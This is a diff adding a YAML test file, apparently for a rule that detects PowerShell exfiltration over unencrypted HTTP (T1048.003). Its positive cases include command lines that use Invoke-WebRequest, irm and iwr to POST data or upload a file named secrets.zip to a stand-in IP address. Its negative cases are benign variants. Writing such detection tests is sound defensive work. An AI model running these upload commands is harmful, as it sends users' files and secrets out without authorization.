@@ -1,0 +1,37 @@
+id: 723b2878-ced4-4052-ab1c-05629a5f4127
+positive:
+- name: Invoke-WebRequest POST with a body to a plain http URL
+  event: &ev
+    event.code: "1"
+    process.name: powershell.exe
+    process.executable: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+    process.command_line: powershell.exe -c "Invoke-WebRequest -Uri http://203.0.113.9/up -Method POST -Body $data"
+    process.parent.name: cmd.exe
+- name: pwsh.exe with the irm alias and -Method Post
+  event:
+    <<: *ev
+    process.name: pwsh.exe
+    process.executable: C:\Program Files\PowerShell\7\pwsh.exe
+    process.command_line: pwsh.exe -c "irm http://203.0.113.9/up -Method Post -Body (gc C:\x.txt)"
+- name: iwr uploading a file with -InFile
+  event:
+    <<: *ev
+    process.command_line: powershell.exe -c "iwr http://203.0.113.9/up -Method Post -InFile C:\Users\bob\secrets.zip"
+negative:
+- name: POST over https is encrypted, not T1048.003
+  event:
+    <<: *ev
+    process.command_line: powershell.exe -c "Invoke-WebRequest -Uri https://api.example.com/up -Method POST -Body $data"
+- name: plain http GET
+  event:
+    <<: *ev
+    process.command_line: powershell.exe -c "Invoke-WebRequest -Uri http://203.0.113.9/file.txt"
+- name: http POST without any body
+  event:
+    <<: *ev
+    process.command_line: powershell.exe -c "Invoke-WebRequest -Uri http://203.0.113.9/ping -Method POST"
+- name: other interpreter
+  event:
+    <<: *ev
+    process.name: cmd.exe
+    process.command_line: cmd.exe /c echo Invoke-WebRequest http://x -Method POST -Body a
